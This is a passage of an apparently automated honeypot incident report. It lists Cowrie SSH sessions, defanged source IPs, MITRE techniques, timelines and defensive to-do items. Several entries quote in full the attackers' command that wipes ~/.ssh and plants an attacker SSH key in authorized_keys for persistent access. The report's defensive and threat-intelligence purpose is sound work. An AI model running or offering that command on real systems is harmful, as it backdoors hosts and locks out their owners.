| `2026-04-13 16:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b90730dd155

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:41 |
| **Last Seen** | 2026-04-13 16:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:41:11` | `cowrie.session.connect` |
| `2026-04-13 16:41:11` | `cowrie.client.version` |
| `2026-04-13 16:41:11` | `cowrie.client.kex` |
| `2026-04-13 16:41:11` | `cowrie.login.success` |
| `2026-04-13 16:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4134b11fe10f

| Field | Detail |
|---|---|
| **Source IP** | `36.138.134[.]121` |
| **First Seen** | 2026-04-13 16:41 |
| **Last Seen** | 2026-04-13 16:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:41:49` | `cowrie.session.connect` |
| `2026-04-13 16:41:49` | `cowrie.client.version` |
| `2026-04-13 16:41:49` | `cowrie.client.kex` |
| `2026-04-13 16:41:50` | `cowrie.login.success` |
| `2026-04-13 16:41:50` | `cowrie.session.params` |
| `2026-04-13 16:41:50` | `cowrie.command.input` |
| `2026-04-13 16:41:50` | `cowrie.command.failed` |
| `2026-04-13 16:41:50` | `cowrie.log.closed` |
| `2026-04-13 16:41:50` | `cowrie.session.params` |
| `2026-04-13 16:41:50` | `cowrie.command.input` |
| `2026-04-13 16:41:51` | `cowrie.session.file_download` |
| `2026-04-13 16:41:51` | `cowrie.log.closed` |
| `2026-04-13 16:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.138.134[.]121` to AbuseIPDB if not already reported
- [ ] Block `36.138.134[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e5cf0434ddf

| Field | Detail |
|---|---|
| **Source IP** | `36.138.134[.]121` |
| **First Seen** | 2026-04-13 16:41 |
| **Last Seen** | 2026-04-13 16:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:41:53` | `cowrie.session.connect` |
| `2026-04-13 16:41:53` | `cowrie.client.version` |
| `2026-04-13 16:41:53` | `cowrie.client.kex` |
| `2026-04-13 16:41:54` | `cowrie.login.success` |
| `2026-04-13 16:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.138.134[.]121` to AbuseIPDB if not already reported
- [ ] Block `36.138.134[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f441b04e462e

| Field | Detail |
|---|---|
| **Source IP** | `15.204.58[.]181` |
| **First Seen** | 2026-04-13 16:42 |
| **Last Seen** | 2026-04-13 16:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:42:42` | `cowrie.session.connect` |
| `2026-04-13 16:42:42` | `cowrie.client.version` |
| `2026-04-13 16:42:42` | `cowrie.client.kex` |
| `2026-04-13 16:42:44` | `cowrie.login.success` |
| `2026-04-13 16:42:44` | `cowrie.session.params` |
| `2026-04-13 16:42:44` | `cowrie.command.input` |
| `2026-04-13 16:42:44` | `cowrie.command.failed` |
| `2026-04-13 16:42:45` | `cowrie.log.closed` |
| `2026-04-13 16:42:45` | `cowrie.session.params` |
| `2026-04-13 16:42:45` | `cowrie.command.input` |
| `2026-04-13 16:42:46` | `cowrie.session.file_download` |
| `2026-04-13 16:42:46` | `cowrie.log.closed` |
| `2026-04-13 16:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `15.204.58[.]181` to AbuseIPDB if not already reported
- [ ] Block `15.204.58[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63598621d732

| Field | Detail |
|---|---|
| **Source IP** | `15.204.58[.]181` |
| **First Seen** | 2026-04-13 16:42 |
| **Last Seen** | 2026-04-13 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:42:49` | `cowrie.session.connect` |
| `2026-04-13 16:42:49` | `cowrie.client.version` |
| `2026-04-13 16:42:49` | `cowrie.client.kex` |
| `2026-04-13 16:42:50` | `cowrie.login.success` |
| `2026-04-13 16:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `15.204.58[.]181` to AbuseIPDB if not already reported
- [ ] Block `15.204.58[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f079072c31ef

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:44 |
| **Last Seen** | 2026-04-13 16:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:44:22` | `cowrie.session.connect` |
| `2026-04-13 16:44:22` | `cowrie.client.version` |
| `2026-04-13 16:44:22` | `cowrie.client.kex` |
| `2026-04-13 16:44:23` | `cowrie.login.success` |
| `2026-04-13 16:44:23` | `cowrie.session.params` |
| `2026-04-13 16:44:23` | `cowrie.command.input` |
| `2026-04-13 16:44:23` | `cowrie.command.failed` |
| `2026-04-13 16:44:23` | `cowrie.log.closed` |
| `2026-04-13 16:44:23` | `cowrie.session.params` |
| `2026-04-13 16:44:23` | `cowrie.command.input` |
| `2026-04-13 16:44:23` | `cowrie.session.file_download` |
| `2026-04-13 16:44:23` | `cowrie.log.closed` |
| `2026-04-13 16:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dc602d3d239

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:44 |
| **Last Seen** | 2026-04-13 16:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:44:25` | `cowrie.session.connect` |
| `2026-04-13 16:44:25` | `cowrie.client.version` |
| `2026-04-13 16:44:25` | `cowrie.client.kex` |
| `2026-04-13 16:44:26` | `cowrie.login.success` |
| `2026-04-13 16:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5af0b8d7b36

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:47 |
| **Last Seen** | 2026-04-13 16:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:47:27` | `cowrie.session.connect` |
| `2026-04-13 16:47:27` | `cowrie.client.version` |
| `2026-04-13 16:47:27` | `cowrie.client.kex` |
| `2026-04-13 16:47:28` | `cowrie.login.success` |
| `2026-04-13 16:47:28` | `cowrie.session.params` |
| `2026-04-13 16:47:28` | `cowrie.command.input` |
| `2026-04-13 16:47:28` | `cowrie.command.failed` |
| `2026-04-13 16:47:28` | `cowrie.log.closed` |
| `2026-04-13 16:47:28` | `cowrie.session.params` |
| `2026-04-13 16:47:28` | `cowrie.command.input` |
| `2026-04-13 16:47:28` | `cowrie.session.file_download` |
| `2026-04-13 16:47:28` | `cowrie.log.closed` |
| `2026-04-13 16:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84c4baaa6021

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:47 |
| **Last Seen** | 2026-04-13 16:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:47:30` | `cowrie.session.connect` |
| `2026-04-13 16:47:30` | `cowrie.client.version` |
| `2026-04-13 16:47:30` | `cowrie.client.kex` |
| `2026-04-13 16:47:31` | `cowrie.login.success` |
| `2026-04-13 16:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-854af67f0f70

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:48 |
| **Last Seen** | 2026-04-13 16:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:48:42` | `cowrie.session.connect` |
| `2026-04-13 16:48:42` | `cowrie.client.version` |
| `2026-04-13 16:48:43` | `cowrie.client.kex` |
| `2026-04-13 16:48:44` | `cowrie.login.success` |
| `2026-04-13 16:48:45` | `cowrie.session.params` |
| `2026-04-13 16:48:45` | `cowrie.command.input` |
| `2026-04-13 16:48:45` | `cowrie.command.failed` |
| `2026-04-13 16:48:45` | `cowrie.log.closed` |
| `2026-04-13 16:48:46` | `cowrie.session.params` |
| `2026-04-13 16:48:46` | `cowrie.command.input` |
| `2026-04-13 16:48:46` | `cowrie.session.file_download` |
| `2026-04-13 16:48:46` | `cowrie.log.closed` |
| `2026-04-13 16:48:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46661d737417

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:48 |
| **Last Seen** | 2026-04-13 16:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:48:50` | `cowrie.session.connect` |
| `2026-04-13 16:48:50` | `cowrie.client.version` |
| `2026-04-13 16:48:50` | `cowrie.client.kex` |
| `2026-04-13 16:48:52` | `cowrie.login.success` |
| `2026-04-13 16:48:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42584c53fd08

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:48 |
| **Last Seen** | 2026-04-13 16:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:48:59` | `cowrie.session.connect` |
| `2026-04-13 16:48:59` | `cowrie.client.version` |
| `2026-04-13 16:48:59` | `cowrie.client.kex` |
| `2026-04-13 16:48:59` | `cowrie.login.success` |
| `2026-04-13 16:49:00` | `cowrie.session.params` |
| `2026-04-13 16:49:00` | `cowrie.command.input` |
| `2026-04-13 16:49:00` | `cowrie.command.failed` |
| `2026-04-13 16:49:00` | `cowrie.log.closed` |
| `2026-04-13 16:49:00` | `cowrie.session.params` |
| `2026-04-13 16:49:00` | `cowrie.command.input` |
| `2026-04-13 16:49:00` | `cowrie.session.file_download` |
| `2026-04-13 16:49:00` | `cowrie.log.closed` |
| `2026-04-13 16:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d138cac6591e

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:49 |
| **Last Seen** | 2026-04-13 16:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:49:02` | `cowrie.session.connect` |
| `2026-04-13 16:49:02` | `cowrie.client.version` |
| `2026-04-13 16:49:02` | `cowrie.client.kex` |
| `2026-04-13 16:49:03` | `cowrie.login.success` |
| `2026-04-13 16:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c88927378fe

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:50 |
| **Last Seen** | 2026-04-13 16:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:50:35` | `cowrie.session.connect` |
| `2026-04-13 16:50:35` | `cowrie.client.version` |
| `2026-04-13 16:50:35` | `cowrie.client.kex` |
| `2026-04-13 16:50:36` | `cowrie.login.success` |
| `2026-04-13 16:50:36` | `cowrie.session.params` |
| `2026-04-13 16:50:36` | `cowrie.command.input` |
| `2026-04-13 16:50:36` | `cowrie.command.failed` |
| `2026-04-13 16:50:36` | `cowrie.log.closed` |
| `2026-04-13 16:50:36` | `cowrie.session.params` |
| `2026-04-13 16:50:36` | `cowrie.command.input` |
| `2026-04-13 16:50:36` | `cowrie.session.file_download` |
| `2026-04-13 16:50:36` | `cowrie.log.closed` |
| `2026-04-13 16:50:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c91297f8e49c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:50 |
| **Last Seen** | 2026-04-13 16:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:50:38` | `cowrie.session.connect` |
| `2026-04-13 16:50:38` | `cowrie.client.version` |
| `2026-04-13 16:50:38` | `cowrie.client.kex` |
| `2026-04-13 16:50:39` | `cowrie.login.success` |
| `2026-04-13 16:50:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba6d96ab5e60

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:50 |
| **Last Seen** | 2026-04-13 16:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:50:41` | `cowrie.session.connect` |
| `2026-04-13 16:50:41` | `cowrie.client.version` |
| `2026-04-13 16:50:41` | `cowrie.client.kex` |
| `2026-04-13 16:50:43` | `cowrie.login.success` |
| `2026-04-13 16:50:44` | `cowrie.session.params` |
| `2026-04-13 16:50:44` | `cowrie.command.input` |
| `2026-04-13 16:50:44` | `cowrie.command.failed` |
| `2026-04-13 16:50:44` | `cowrie.log.closed` |
| `2026-04-13 16:50:45` | `cowrie.session.params` |
| `2026-04-13 16:50:45` | `cowrie.command.input` |
| `2026-04-13 16:50:46` | `cowrie.session.file_download` |
| `2026-04-13 16:50:46` | `cowrie.log.closed` |
| `2026-04-13 16:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df6ff4e9a3e7

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:50 |
| **Last Seen** | 2026-04-13 16:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:50:49` | `cowrie.session.connect` |
| `2026-04-13 16:50:49` | `cowrie.client.version` |
| `2026-04-13 16:50:49` | `cowrie.client.kex` |
| `2026-04-13 16:50:51` | `cowrie.login.success` |
| `2026-04-13 16:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f652728c67f

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:52 |
| **Last Seen** | 2026-04-13 16:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
